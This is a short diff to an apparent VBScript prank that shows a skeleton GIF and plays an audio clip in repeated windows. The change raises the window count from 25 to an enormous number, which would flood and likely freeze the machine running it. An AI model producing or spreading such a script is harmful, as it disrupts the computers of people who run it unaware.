@@ -4,7 +4,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 ' --- Configuration ---
 strImageUrl = "https://media1.tenor.com/m/HNObdUglgfgAAAAC/skeleton-banging-shield.gif"
 strAudioUrl = "https://quicksounds.com/uploads/tracks/515006306_914315829_470386365.mp3"
-intWindowCount = 25
+intWindowCount = 358235852383285853
 
 ' --- Setup Audio ---
 Set player = CreateObject("WMPlayer.OCX")
@@ -52,3 +52,4 @@ Loop
 ' Cleanup
 On Error Resume Next
 objFSO.DeleteFile strHtmlFile
+
